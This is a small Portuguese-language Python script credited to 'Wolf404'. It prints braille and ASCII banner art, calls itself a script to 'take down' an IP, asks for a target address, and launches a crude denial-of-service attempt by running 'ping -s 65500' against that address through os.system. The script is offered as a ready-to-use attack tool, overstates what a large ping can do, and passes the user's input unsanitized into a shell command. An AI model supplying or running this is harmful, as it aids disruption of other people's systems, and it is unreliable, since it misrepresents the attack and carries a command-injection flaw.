import os
import time
branco= '\033[37m'
azul= '\033[34m'
vermelho= '\033[31m'
def script():
    os.system("clear")
    time.sleep(1)
    print(branco+"⣿⣿⣿⣵⣿⣿⣿⠿⡟⣛⣧⣿⣯⣿⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿")
    print("⣿⣿⣿⣿⣿⠋⠁⣴⣶⣿⣿⣿⣿⣿⣿⣿⣦⣍⢿⣿⣿⣿⣿⣿ ")
    print("⣿⣿⣿⣿⢷⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢼⣿⣿⣿⣿")
    print("⢹⣿⣿⢻⠎⠔⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿")
    print("⢸⣿⣿⠇⡶⠄⣿⣿⠿⠟⡛⠛⠻⣿⡿⠿⠿⣿⣗⢣⣿⣿⣿⣿")
    print(azul+"⠐⣿⣿⡿⣷⣾⣿⣿⣿⣾⣶⣶⣶⣿⣁⣔⣤⣀⣼⢲⣿⣿⣿⣿")
    print("⠄⣿⣿⣿⣿⣾⣟⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⢟⣾⣿⣿⣿⣿ ")
    print("⠄⣟⣿⣿⣿⡷⣿⣿⣿⣿⣿⣮⣽⠛⢻⣽⣿⡇⣾⣿⣿⣿⣿⣿ ")
    print("⠄⢻⣿⣿⣿⡷⠻⢻⡻⣯⣝⢿⣟⣛⣛⣛⠝⢻⣿⣿⣿⣿⣿⣿ ")
    print("⠄⠸⣿⣿⡟⣹⣦⠄⠋⠻⢿⣶⣶⣶⡾⠃⡂⢾⣿⣿⣿⣿⣿⣿")
    print(vermelho+"⠄⠄⠟⠋⠄⢻⣿⣧⣲⡀⡀⠄⠉⠱⣠⣾⡇⠄⠉⠛⢿⣿⣿⣿")
    print("⠄⠄⠄⠄⠄⠈⣿⣿⣿⣷⣿⣿⢾⣾⣿⣿⣇⠄⠄⠄⠄⠄⠉⠉")
    print("⠄⠄⠄⠄⠄⠄⠸⣿⣿⠟⠃⠄⠄⢈⣻⣿⣿⠄⠄⠄⠄⠄⠄⠄")
    print("⠄⠄⠄⠄⠄⠄⠄⢿⣿⣾⣷⡄⠄⢾⣿⣿⣿⡄⠄⠄⠄⠄⠄⠄") 
    print("⠄⠄⠄⠄⠄⠄⠄⠸⣿⣿⣿⠃⠄⠈⢿⣿⣿⠄⠄⠄⠄⠄⠄⠄")
    time.sleep(1)
    print("\n")
    print (azul+"░█▀█░█░█░▀█▀░▀█▀░█▀█░░░▀█▀░█▀█")
    print("░█▀▀░█░█░░█░░░█░░█░█░░░░█░░█▀▀")
    print("░▀░░░▀▀▀░░▀░░▀▀▀░▀░▀░░░▀▀▀░▀░░")
    time.sleep(1)
    print("\n")
    print(vermelho+"Criado por "+azul+"Wolf404")
    time.sleep(1)
    print(vermelho+"Bem vindo ao script de derrubar Ip!")
    print("\n")
    ip=input("Digite o endereço de ip: "+azul)
    time.sleep(1)
    print(vermelho+"Para parar o ataque, aperte"+azul+" ctrl+d")
    print("Ataque iniciado...")
    os.system("ping -s 65500 "+ip)
script()
    
    

